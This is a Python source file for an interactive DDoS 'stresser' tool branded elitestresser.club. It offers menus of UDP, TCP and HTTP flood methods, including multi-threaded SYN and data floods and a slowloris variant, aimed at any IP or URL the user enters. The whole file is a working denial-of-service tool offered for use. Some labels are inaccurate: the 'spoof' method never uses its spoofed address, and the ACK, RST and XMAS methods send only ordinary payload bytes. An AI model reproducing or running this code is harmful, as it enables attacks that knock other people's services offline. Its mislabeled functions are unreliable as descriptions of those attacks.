import socket
import random
import time
import threading
import requests
from colorama import init, Fore

# Initialize Colorama for colored output
init(autoreset=True)

# Set the window title
print(f"\033]0;IP Stresser DDOS V2.0 By elitestresser.club\007", end="", flush=True)

# ASCII Art for a slick intro
ASCII_ART = """
 _______  ___      ___   _______  _______ 
|       ||   |    |   | |       ||       |
|    ___||   |    |   | |_     _||    ___|
|   |___ |   |    |   |   |   |  |   |___ 
|    ___||   |___ |   |   |   |  |    ___|
|   |___ |       ||   |   |   |  |   |___ 
|_______||_______||___|   |___|  |_______|
IP Stresser DDOS V2.0 By elitestresser.club
"""

# UDP Flood Methods
def udp_plain_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size
    print(Fore.CYAN + f"[🚀] UDP Plain Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_random_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Random Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_burst_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Burst Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            for _ in range(10):  # Burst of 10 packets
                payload = random.randbytes(packet_size)
                sock.sendto(payload, (ip, port))
                packet_count += 1
            time.sleep(0.1)  # Short pause between bursts
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_spoof_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Spoof Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            spoof_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets (Spoofed IPs may not reflect).")

def udp_frag_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Frag Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size // 2)  # Simulate fragmented packets
            sock.sendto(payload, (ip, port))
            sock.sendto(payload, (ip, port))  # Send two parts
            packet_count += 2
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

# TCP Flood Methods
def tcp_syn_flood_single(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP SYN Flood (Single) on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} SYN packets.")

def tcp_syn_flood_multi(ip, port, duration):
    end_time = time.time() + duration
    packet_count = [0]
    def syn_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while time.time() < end_time:
            try:
                sock.connect_ex((ip, port))
                packet_count[0] += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except:
                pass
        sock.close()
    print(Fore.CYAN + f"[🚀] TCP SYN Flood (Multi) on {ip}:{port} | {duration}s...")
    threads = [threading.Thread(target=syn_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count[0]} SYN packets.")

def tcp_data_flood_single(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)
    print(Fore.CYAN + f"[🚀] TCP Data Flood (Single) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def tcp_data_flood_multi(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = [0]
    def data_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload = random.randbytes(packet_size)
        try:
            sock.connect((ip, port))
            while time.time() < end_time:
                sock.send(payload)
                packet_count[0] += 1
        except:
            pass
        sock.close()
    print(Fore.CYAN + f"[🚀] TCP Data Flood (Multi) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    threads = [threading.Thread(target=data_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count[0]} packets.")

def tcp_ack_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP ACK Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x00" * 10)  # Small ACK-like packet
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} ACK packets.")

def tcp_rst_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP RST Flood on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            sock.close()  # Immediate close to simulate RST
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} RST packets.")

def tcp_xmas_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP XMAS Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\xFF" * 10)  # Simulate XMAS packet with all flags
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} XMAS packets.")

# HTTP/HTTPS Flood Methods
def http_get_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP GET Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} GET requests.")

def http_post_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP POST Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.post(url, data={"flood": "data" * 100}, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} POST requests.")

def https_slowloris(url, duration):
    end_time = time.time() + duration
    connection_count = 0
    sockets = []
    print(Fore.CYAN + f"[🚀] HTTPS Slowloris on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((url.split("/")[2], 443))  # Assuming HTTPS on port 443
            sock.send(b"GET / HTTP/1.1\r\nHost: " + url.split("/")[2].encode() + b"\r\n")
            sockets.append(sock)
            connection_count += 1
            time.sleep(0.1)  # Slow connection buildup
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        for sock in sockets:
            sock.close()
        print(Fore.GREEN + f"[✅] Done! Opened {connection_count} connections.")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int):
    while True:
        try:
            value = input_type(input(Fore.LIGHTBLUE_EX + prompt))
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[❌] Invalid input! Numbers only.")

def main():
    print(Fore.YELLOW + ASCII_ART)
    print(Fore.LIGHTBLUE_EX + "🔹 Protocols 🔹")
    print("  1. UDP 🌊")
    print("  2. TCP ⚡")
    print("  3. HTTP/HTTPS 🌐")
    protocol = input(Fore.LIGHTBLUE_EX + "Select protocol (1-3): ").strip()

    if protocol == "1":  # UDP
        print(Fore.LIGHTBLUE_EX + "\n🔹 UDP Methods 🔹")
        print("  1. Plain (Fixed payload)")
        print("  2. Random (Random payload)")
        print("  3. Burst (10-packet bursts)")
        print("  4. Spoof (Random source IPs)")
        print("  5. Frag (Fragmented packets)")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-5): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float) ## elitestresser.club
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        if method == "1":
            udp_plain_flood(ip, port, duration, packet_size)
        elif method == "2":
            udp_random_flood(ip, port, duration, packet_size)
        elif method == "3":
            udp_burst_flood(ip, port, duration, packet_size)
        elif method == "4":
            udp_spoof_flood(ip, port, duration, packet_size)
        elif method == "5":
            udp_frag_flood(ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid UDP method!")

    elif protocol == "2":  # TCP
        print(Fore.LIGHTBLUE_EX + "\n🔹 TCP Methods 🔹")
        print("  1. SYN Flood (Single)")
        print("  2. SYN Flood (Multi-threaded)")
        print("  3. Data Flood (Single)")
        print("  4. Data Flood (Multi-threaded)")
        print("  5. ACK Flood")
        print("  6. RST Flood")
        print("  7. XMAS Flood")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-7): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)

        if method in ["3", "4"]:
            packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        if method == "1":
            tcp_syn_flood_single(ip, port, duration)
        elif method == "2":
            tcp_syn_flood_multi(ip, port, duration)
        elif method == "3":
            tcp_data_flood_single(ip, port, duration, packet_size)
        elif method == "4":
            tcp_data_flood_multi(ip, port, duration, packet_size)
        elif method == "5":
            tcp_ack_flood(ip, port, duration)
        elif method == "6":
            tcp_rst_flood(ip, port, duration)
        elif method == "7":
            tcp_xmas_flood(ip, port, duration)
        else:
            print(Fore.RED + "[❌] Invalid TCP method!")

    elif protocol == "3":  # HTTP/HTTPS
        print(Fore.LIGHTBLUE_EX + "\n🔹 HTTP/HTTPS Methods 🔹")
        print("  1. GET Flood")
        print("  2. POST Flood")
        print("  3. Slowloris (HTTPS)")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-3): ").strip()

        url = input(Fore.LIGHTBLUE_EX + "Enter URL (e.g., http://example.com): ")
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float) ##nightmarestresser.co

        if method == "1":
            http_get_flood(url, duration)
        elif method == "2":
            http_post_flood(url, duration)
        elif method == "3":
            https_slowloris(url, duration)
        else:
            print(Fore.RED + "[❌] Invalid HTTP/HTTPS method!")

    else:
        print(Fore.RED + "[❌] Invalid protocol!")

if __name__ == "__main__":
    main()
